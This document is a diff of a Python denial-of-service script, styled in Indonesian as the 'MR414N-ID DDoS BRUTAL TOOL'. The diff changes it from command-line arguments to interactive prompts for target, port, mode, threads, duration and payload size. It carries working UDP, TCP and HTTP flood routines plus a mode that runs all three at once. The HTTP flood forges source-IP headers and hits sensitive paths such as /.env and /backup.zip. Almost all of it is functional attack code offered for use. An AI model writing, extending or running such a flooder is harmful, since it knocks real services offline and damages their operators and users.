@@ -1,6 +1,6 @@
-# lang: Python 3.11+, file: mr414n_ddos.py
+# lang: Python 3.11+, file: ddos.py
 # build: pip install colorama
-# usage: python mr414n_ddos.py
+# usage: python ddos.py
 
 import socket
 import threading
@@ -8,95 +8,229 @@ import random
 import time
 import sys
 import os
-import argparse
 from concurrent.futures import ThreadPoolExecutor
-from colorama import Fore, Style, init
+from colorama import Fore, Back, Style, init
 
 init(autoreset=True)
 
-# ---- BEBEK LINUX ASCII ----
+# ---- RAINBOW TEXT ----
+
+def rainbow(text):
+    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
+    out = ""
+    i = 0
+    for ch in text:
+        if ch != ' ':
+            out += colors[i % len(colors)] + Style.BRIGHT + ch
+            i += 1
+        else:
+            out += ' '
+    return out + Style.RESET_ALL
+
+# ---- BEBEK LINUX ----
 
 def tampil_bebek():
-    bebek = f"""
-{Fore.YELLOW}
-        .88888888:.
-       88888888.88888.
-     .8888888888888888.
-     888888888888888888
-     88' _`88'_  `8888.
-     88 88 88 88  8888  oooooooooooooooooooooooo
-     88_88_::_88_:88888:o                       o
-     88:::,::,:::::8888 o   Linux DDoS Tool    o
-     88`:::::::::'`8888  o                       o
-    .88  `:::::'    8:88. oooooooooooooooooooooooo
-   8888            `8:888.
- .8888'             `888888.
-.8888:..  .::.  ...:'8888888:.
-8888.'     :'     `'::`88:88888
-{Fore.RESET}"""
-    print(bebek)
+    bebek_lines = [
+        r"        .88888888:.",
+        r"       88888888.88888.",
+        r"     .8888888888888888.",
+        r"     888888888888888888",
+        r"     88' _`88'_  `8888.",
+        r"     88 88 88 88  88888",
+        r"     88_88_::_88_:88888",
+        r"     88:::,::,:::::8888",
+        r"     88`:::::::::'`8888",
+        r"    .88  `:::::'    8:88.",
+        r"   8888            `8:888.",
+        r" .8888'             `888888.",
+        r".8888:..  .::.  ...:'8888888:.",
+        r"8888.'     :'     `'::`88:88888",
+        r"`8888;..  ;;;;.  ;;;; `88:88888",
+        r" `8888888888888' 8888  88:88888",
+        r"  `.8888888888'  8888  88888888",
+    ]
+    colors = [Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.YELLOW, Fore.GREEN]
+    for idx, line in enumerate(bebek_lines):
+        print(colors[idx % len(colors)] + Style.BRIGHT + line)
+        time.sleep(0.04)
+    print()
 
-# ---- BANNER MR414N-ID ----
+# ---- BANNER MR414N-ID ASCII ----
 
 def tampil_banner():
-    banner = f"""
-{Fore.RED}{Style.BRIGHT}
-███╗   ███╗██████╗ ██████╗  ██╗ ██╗  ██╗███╗   ██╗      ██╗██████╗
-████╗ ████║██╔══██╗╚════██╗ ██║ ██║  ██║████╗  ██║      ██║██╔══██╗
-██╔████╔██║██████╔╝ █████╔╝ ██║ ███████║██╔██╗ ██║      ██║██║  ██║
-██║╚██╔╝██║██╔══██╗ ╚═══██╗ ╚═╝ ╚════██║██║╚██╗██║      ██║██║  ██║
-██║ ╚═╝ ██║██║  ██║██████╔╝ ██╗      ██║██║ ╚████║      ██║██████╔╝
-╚═╝     ╚═╝╚═╝  ╚═╝╚═════╝  ╚═╝      ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝
-{Fore.RESET}"""
+    baris = [
+        "███╗   ███╗██████╗ ██╗  ██╗ ██╗██╗  ██╗███╗   ██╗      ██╗██████╗ ",
+        "████╗ ████║██╔══██╗ ██╗██╔╝ ██║██║  ██║████╗  ██║      ██║██╔══██╗",
+        "██╔████╔██║██████╔╝  ████╔╝  ██║███████║██╔██╗ ██║      ██║██║  ██║",
+        "██║╚██╔╝██║██╔══██╗ ██╔╝██╗  ╚═╝╚════██║██║╚██╗██║      ██║██║  ██║",
+        "██║ ╚═╝ ██║██║  ██║██╔╝  ██╗ ██╗     ██║██║ ╚████║      ██║██████╔╝",
+        "╚═╝     ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝ ╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═╝╚═════╝ ",
+    ]
+    print()
+    for line in baris:
+        print(rainbow(line))
+        time.sleep(0.07)
+    print()
 
-    ddos = f"""
-{Fore.CYAN}{Style.BRIGHT}
-██████╗ ██████╗  ██████╗ ███████╗
-██╔══██╗██╔══██╗██╔═══██╗██╔════╝
-██║  ██║██║  ██║██║   ██║███████╗
-██║  ██║██║  ██║██║   ██║╚════██║
-██████╔╝██████╔╝╚██████╔╝███████║
-╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
-{Fore.RESET}"""
-    print(banner)
-    print(ddos)
+# ---- BANNER DDoS ----
 
-# ---- ANIMASI LOADING ----
+def tampil_ddos():
+    ddos_baris = [
+        "██████╗ ██████╗  ██████╗ ███████╗",
+        "██╔══██╗██╔══██╗██╔═══██╗██╔════╝",
+        "██║  ██║██║  ██║██║   ██║███████╗",
+        "██║  ██║██║  ██║██║   ██║╚════██║",
+        "██████╔╝██████╔╝╚██████╔╝███████║",
+        "╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝",
+    ]
+    for line in ddos_baris:
+        print(Fore.CYAN + Style.BRIGHT + line)
+        time.sleep(0.07)
+    print()
 
-def animasi_loading(teks, durasi=2):
+# ---- ANIMASI LOADING BAR ----
+
+def loading_bar(teks, durasi=2.0):
+    bar_len = 40
+    start = time.time()
+    while True:
+        elapsed = time.time() - start
+        ratio = min(elapsed / durasi, 1.0)
+        filled = int(bar_len * ratio)
+        bar = "█" * filled + "░" * (bar_len - filled)
+        pct = int(ratio * 100)
+        sys.stdout.write(
+            f"\r{Fore.GREEN}[{Fore.YELLOW}{bar}{Fore.GREEN}] "
+            f"{Fore.WHITE}{Style.BRIGHT}{pct}% {Fore.CYAN}{teks}{Style.RESET_ALL}"
+        )
+        sys.stdout.flush()
+        if ratio >= 1.0:
+            break
+        time.sleep(0.03)
+    print()
+
+# ---- ANIMASI SPINNER ----
+
+def spinner(teks, durasi=1.5):
     chars = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
     end = time.time() + durasi
     i = 0
     while time.time() < end:
-        sys.stdout.write(f"\r{Fore.GREEN}[{chars[i % len(chars)]}] {teks}{Style.RESET_ALL}")
+        sys.stdout.write(f"\r{Fore.MAGENTA}[{chars[i % len(chars)]}] {Fore.WHITE}{Style.BRIGHT}{teks}{Style.RESET_ALL}")
         sys.stdout.flush()
-        time.sleep(0.1)
+        time.sleep(0.08)
         i += 1
     print()
 
-# ---- INFO SISTEM ----
+# ---- RESOLVE HOSTNAME ----
 
-def tampil_info(target, port, mode, threads, durasi):
-    print(f"{Fore.WHITE}{Style.BRIGHT}{'═'*60}")
-    print(f"{Fore.YELLOW}  [*] TARGET IP   : {Fore.RED}{Style.BRIGHT}{target}")
-    print(f"{Fore.YELLOW}  [*] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
-    print(f"{Fore.YELLOW}  [*] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
-    print(f"{Fore.YELLOW}  [*] THREADS     : {Fore.RED}{Style.BRIGHT}{threads}")
-    print(f"{Fore.YELLOW}  [*] DURASI      : {Fore.RED}{Style.BRIGHT}{durasi} detik")
-    print(f"{Fore.YELLOW}  [*] STATUS      : {Fore.GREEN}{Style.BRIGHT}AKTIF")
-    print(f"{Fore.WHITE}{Style.BRIGHT}{'═'*60}\n")
+def resolve_target(host):
+    try:
+        ip = socket.gethostbyname(host)
+        return ip
+    except Exception:
+        return None
+
+# ---- INPUT INTERAKTIF ----
+
+def input_interaktif():
+    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+    print(Fore.RED + Style.BRIGHT + "  ⚡ MR414N-ID DDoS BRUTAL TOOL ⚡")
+    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+    print()
+
+    # target
+    while True:
+        target_raw = input(
+            f"{Fore.YELLOW}{Style.BRIGHT}  [?] MASUKKAN LINK / IP TARGET{Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+        ).strip()
+        print(Style.RESET_ALL, end="")
+        if not target_raw:
+            print(Fore.RED + "  [!] Target tidak boleh kosong.")
+            continue
+        # strip http/https
+        host = target_raw.replace("https://","").replace("http://","").split("/")[0]
+        spinner(f"Resolving {host}...", 1.2)
+        ip = resolve_target(host)
+        if not ip:
+            print(Fore.RED + f"  [!] Gagal resolve {host}. Coba lagi.")
+            continue
+        if ip != host:
+            print(Fore.GREEN + f"  [✓] Resolved: {host} → {Fore.RED}{Style.BRIGHT}{ip}")
+        break
+
+    # port
+    port_raw = input(
+        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PORT TARGET {Fore.WHITE}(default 80){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+    ).strip()
+    print(Style.RESET_ALL, end="")
+    port = int(port_raw) if port_raw.isdigit() else 80
+
+    # mode
+    print(f"{Fore.YELLOW}{Style.BRIGHT}  [?] MODE SERANGAN:")
+    print(f"{Fore.CYAN}      [1] UDP  — saturasi bandwidth, paling brutal")
+    print(f"{Fore.CYAN}      [2] TCP  — banjiri connection table")
+    print(f"{Fore.CYAN}      [3] HTTP — L7 flood, pukul CPU server")
+    print(f"{Fore.CYAN}      [4] MIX  — semua mode sekaligus (paling brutal)")
+    mode_raw = input(
+        f"{Fore.YELLOW}{Style.BRIGHT}  [?] PILIH MODE {Fore.WHITE}(1/2/3/4, default 1){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+    ).strip()
+    print(Style.RESET_ALL, end="")
+    mode_map_input = {"1":"udp","2":"tcp","3":"http","4":"mix"}
+    mode = mode_map_input.get(mode_raw, "udp")
+
+    # threads
+    thr_raw = input(
+        f"{Fore.YELLOW}{Style.BRIGHT}  [?] JUMLAH THREAD {Fore.WHITE}(default 500){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+    ).strip()
+    print(Style.RESET_ALL, end="")
+    threads = int(thr_raw) if thr_raw.isdigit() else 500
+
+    # durasi
+    dur_raw = input(
+        f"{Fore.YELLOW}{Style.BRIGHT}  [?] DURASI SERANGAN {Fore.WHITE}(detik, default 60){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+    ).strip()
+    print(Style.RESET_ALL, end="")
+    durasi = int(dur_raw) if dur_raw.isdigit() else 60
+
+    # ukuran payload
+    ukuran_raw = input(
+        f"{Fore.YELLOW}{Style.BRIGHT}  [?] UKURAN PAYLOAD {Fore.WHITE}(bytes, default 65000){Fore.WHITE} » {Fore.RED}{Style.BRIGHT}"
+    ).strip()
+    print(Style.RESET_ALL, end="")
+    ukuran = int(ukuran_raw) if ukuran_raw.isdigit() else 65000
+
+    return ip, host, port, mode, threads, durasi, ukuran
+
+# ---- TAMPIL INFO SERANGAN ----
+
+def tampil_info(host, ip, port, mode, threads, durasi, ukuran):
+    print()
+    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+    print(Fore.RED   + Style.BRIGHT + "  💀 SERANGAN DIMULAI 💀")
+    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+    print(f"{Fore.YELLOW}  [»] HOST        : {Fore.RED}{Style.BRIGHT}{host}")
+    print(f"{Fore.YELLOW}  [»] IP TARGET   : {Fore.RED}{Style.BRIGHT}{ip}")
+    print(f"{Fore.YELLOW}  [»] PORT        : {Fore.RED}{Style.BRIGHT}{port}")
+    print(f"{Fore.YELLOW}  [»] MODE        : {Fore.RED}{Style.BRIGHT}{mode.upper()}")
+    print(f"{Fore.YELLOW}  [»] THREADS     : {Fore.RED}{Style.BRIGHT}{threads}")
+    print(f"{Fore.YELLOW}  [»] DURASI      : {Fore.RED}{Style.BRIGHT}{durasi} detik")
+    print(f"{Fore.YELLOW}  [»] PAYLOAD     : {Fore.RED}{Style.BRIGHT}{ukuran} bytes")
+    print(f"{Fore.YELLOW}  [»] STATUS      : {Fore.GREEN}{Style.BRIGHT}⚡ AKTIF ⚡")
+    print(Fore.WHITE + Style.BRIGHT + "═" * 65)
+    print()
 
 # ---- STATISTIK GLOBAL ----
 
 stats = {"kirim": 0, "error": 0, "bytes": 0}
-lock = threading.Lock()
+lock  = threading.Lock()
 
-# ---- UDP FLOOD ----
+# ---- FLOOD FUNCTIONS ----
 
-def udp_flood(target, port, end_time, ukuran):
+def udp_flood(ip, port, end_time, ukuran):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
-    tujuan = (target, port)
+    tujuan = (ip, port)
     while time.time() < end_time:
         try:
             data = random.randbytes(ukuran)
@@ -109,16 +243,14 @@ def udp_flood(target, port, end_time, ukuran):
                 stats["error"] += 1
     sock.close()
 
-# ---- TCP FLOOD ----
-
-def tcp_flood(target, port, end_time, ukuran):
+def tcp_flood(ip, port, end_time, ukuran):
     while time.time() < end_time:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(1)
-            sock.connect((target, port))
-            sock.sendall(random.randbytes(ukuran))
-            sock.close()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((ip, port))
+            s.sendall(random.randbytes(ukuran))
+            s.close()
             with lock:
                 stats["kirim"] += 1
                 stats["bytes"] += ukuran
@@ -126,41 +258,45 @@ def tcp_flood(target, port, end_time, ukuran):
             with lock:
                 stats["error"] += 1
 
-# ---- HTTP FLOOD ----
-
-def http_flood(target, port, end_time, ukuran):
-    user_agents = [
+def http_flood(ip, port, end_time, ukuran):
+    uas = [
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
-        "curl/8.1.2",
+        "Mozilla/5.0 (Linux; Android 13; Pixel 8) AppleWebKit/537.36",
+        "curl/8.4.0",
         "python-requests/2.31.0",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
+        "Googlebot/2.1 (+http://www.google.com/bot.html)",
     ]
     paths = [
-        "/", "/index.php", "/login", "/api/v1/users",
-        "/search?q=" + "X"*128, "/wp-admin", "/admin/login",
-        "/.env", "/config.php", "/api/data?id=" + "1"*64,
+        "/", "/index.php", "/login", "/admin", "/wp-admin",
+        "/api/v1/users", "/search?q=" + "A"*256,
+        "/.env", "/config.php", "/backup.zip",
+        "/api/data?id=" + "1"*128, "/xmlrpc.php",
+        "/?a=" + "X"*512,
     ]
+    rnd_ip = lambda: f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
     while time.time() < end_time:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            sock.connect((target, port))
-            ua = random.choice(user_agents)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((ip, port))
+            ua   = random.choice(uas)
             path = random.choice(paths)
-            req = (
+            req  = (
                 f"GET {path} HTTP/1.1\r\n"
-                f"Host: {target}\r\n"
+                f"Host: {ip}\r\n"
                 f"User-Agent: {ua}\r\n"
-                f"Accept: text/html,application/xhtml+xml,*/*;q=0.9\r\n"
-                f"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8\r\n"
+                f"Accept: text/html,application/xhtml+xml,*/*\r\n"
+                f"Accept-Language: id-ID,id;q=0.9\r\n"
                 f"Accept-Encoding: gzip, deflate\r\n"
                 f"Connection: keep-alive\r\n"
-                f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
-                f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n\r\n"
+                f"X-Forwarded-For: {rnd_ip()}\r\n"
+                f"X-Real-IP: {rnd_ip()}\r\n"
+                f"X-Originating-IP: {rnd_ip()}\r\n"
+                f"Referer: https://www.google.com/\r\n\r\n"
             ).encode()
-            sock.sendall(req)
-            sock.close()
+            s.sendall(req)
+            s.close()
             with lock:
                 stats["kirim"] += 1
                 stats["bytes"] += len(req)
@@ -168,77 +304,108 @@ def http_flood(target, port, end_time, ukuran):
             with lock:
                 stats["error"] += 1
 
-# ---- PRINTER STATISTIK LIVE ----
+# ---- STATISTIK LIVE ----
 
-def cetak_statistik(target, port, mode, end_time):
+def cetak_statistik(ip, port, mode, end_time, durasi_total):
+    bar_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
+    tick = 0
     while time.time() < end_time:
         with lock:
             k = stats["kirim"]
             e = stats["error"]
             b = stats["bytes"]
-        sisa = max(0, end_time - time.time())
-        elapsed = max(0.1, (args.durasi - sisa))
-        pps = k / elapsed
-        mbps = (b * 8) / (elapsed * 1_000_000)
+        sisa    = max(0.0, end_time - time.time())
+        elapsed = max(0.1, durasi_total - sisa)
+        pps     = k / elapsed
+        mbps    = (b * 8) / (elapsed * 1_000_000)
+        pct     = int((1 - sisa / durasi_total) * 100)
+        bar_len = 30
+        filled  = int(bar_len * (1 - sisa / durasi_total))
+        bar     = "█" * filled + "░" * (bar_len - filled)
+        bc      = bar_colors[tick % len(bar_colors)]
+
         sys.stdout.write(
-            f"\r{Fore.GREEN}[+]{Style.RESET_ALL} "
-            f"{Fore.RED}TARGET:{Style.RESET_ALL} {target}:{port} | "
-            f"{Fore.YELLOW}MODE:{Style.RESET_ALL} {mode.upper()} | "
-            f"{Fore.CYAN}KIRIM:{Style.RESET_ALL} {k:,} | "
-            f"{Fore.MAGENTA}PPS:{Style.RESET_ALL} {pps:.0f} | "
-            f"{Fore.BLUE}Mbps:{Style.RESET_ALL} {mbps:.2f} | "
-            f"{Fore.RED}ERROR:{Style.RESET_ALL} {e:,} | "
-            f"{Fore.WHITE}SISA:{Style.RESET_ALL} {sisa:.0f}s    "
+            f"\r{Fore.WHITE}[{bc}{bar}{Fore.WHITE}]{pct:3d}% "
+            f"{Fore.RED}⚡{Style.RESET_ALL} "
+            f"{Fore.YELLOW}TARGET:{Fore.RED}{Style.BRIGHT}{ip}:{port}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.YELLOW}MODE:{Fore.RED}{Style.BRIGHT}{mode.upper()}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.GREEN}KIRIM:{Fore.WHITE}{Style.BRIGHT}{k:,}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.MAGENTA}PPS:{Fore.WHITE}{Style.BRIGHT}{pps:,.0f}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.BLUE}Mbps:{Fore.WHITE}{Style.BRIGHT}{mbps:.2f}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.RED}ERR:{Fore.WHITE}{Style.BRIGHT}{e:,}{Style.RESET_ALL} "
+            f"{Fore.CYAN}│{Style.RESET_ALL} "
+            f"{Fore.WHITE}SISA:{Fore.YELLOW}{Style.BRIGHT}{sisa:.0f}s{Style.RESET_ALL}    "
         )
         sys.stdout.flush()
-        time.sleep(0.3)
-    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}[✓] SELESAI! Total kirim: {stats['kirim']:,} | Error: {stats['error']:,} | Data: {stats['bytes']/1_000_000:.2f} MB{Style.RESET_ALL}")
+        tick += 1
+        time.sleep(0.25)
 
-# ---- MAIN ----
+    print(f"\n\n{Fore.GREEN}{Style.BRIGHT}{'═'*65}")
+    print(f"  [✓] SELESAI! Serangan selesai.")
+    print(f"  [»] Total Kirim : {stats['kirim']:,} paket")
+    print(f"  [»] Total Error : {stats['error']:,}")
+    print(f"  [»] Total Data  : {stats['bytes']/1_000_000:.2f} MB")
+    print(f"{'═'*65}{Style.RESET_ALL}")
+
+# ======== MAIN ========
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="MR414N-ID DDoS Tool")
-    parser.add_argument("--target",   required=True, help="IP atau hostname target")
-    parser.add_argument("--port",     type=int, default=80, help="Port target")
-    parser.add_argument("--mode",     choices=["udp","tcp","http"], default="udp", help="Mode flood")
-    parser.add_argument("--threads",  type=int, default=200, help="Jumlah thread")
-    parser.add_argument("--durasi",   type=int, default=60,  help="Durasi (detik)")
-    parser.add_argument("--ukuran",   type=int, default=1024, help="Ukuran payload (bytes)")
-    args = parser.parse_args()
-
     os.system("clear" if os.name == "posix" else "cls")
 
     tampil_bebek()
-    time.sleep(0.5)
     tampil_banner()
-    time.sleep(0.5)
+    tampil_ddos()
 
-    animasi_loading("Menginisialisasi sistem...", 1.5)
-    animasi_loading("Menyiapkan payload...", 1.0)
-    animasi_loading("Membuka koneksi...", 1.0)
+    loading_bar("Memuat sistem senjata...", 1.5)
+    loading_bar("Menyiapkan payload brutal...", 1.2)
+    spinner("Mengaktifkan mode berdarah...", 1.0)
 
-    end_time = time.time() + args.durasi
-    tampil_info(args.target, args.port, args.mode, args.threads, args.durasi)
+    print()
+    ip, host, port, mode, threads, durasi, ukuran = input_interaktif()
 
-    mode_map = {
-        "udp":  udp_flood,
-        "tcp":  tcp_flood,
-        "http": http_flood,
-    }
-    func = mode_map[args.mode]
+    loading_bar("Mengunci target...", 1.5)
+    spinner("Membuka jalur serangan...", 1.0)
 
+    tampil_info(host, ip, port, mode, threads, durasi, ukuran)
+
+    end_time = time.time() + durasi
+
+    # stat thread
     stat_thread = threading.Thread(
         target=cetak_statistik,
-        args=(args.target, args.port, args.mode, end_time),
+        args=(ip, port, mode, end_time, durasi),
         daemon=True
     )
     stat_thread.start()
 
-    with ThreadPoolExecutor(max_workers=args.threads) as pool:
-        futures = [
-            pool.submit(func, args.target, args.port, end_time, args.ukuran)
-            for _ in range(args.threads)
-        ]
-        for f in futures:
-            try: f.result()
-            except: pass
+    # dispatch
+    flood_map = {
+        "udp":  udp_flood,
+        "tcp":  tcp_flood,
+        "http": http_flood,
+    }
+
+    if mode == "mix":
+        # semua mode sekaligus, bagi thread rata
+        per_mode = threads // 3
+        all_funcs = [udp_flood, tcp_flood, http_flood]
+        with ThreadPoolExecutor(max_workers=threads) as pool:
+            futures = []
+            for fn in all_funcs:
+                for _ in range(per_mode):
+                    futures.append(pool.submit(fn, ip, port, end_time, ukuran))
+            for f in futures:
+                try: f.result()
+                except: pass
+    else:
+        fn = flood_map[mode]
+        with ThreadPoolExecutor(max_workers=threads) as pool:
+            futures = [pool.submit(fn, ip, port, end_time, ukuran) for _ in range(threads)]
+            for f in futures:
+                try: f.result()
+                except: pass
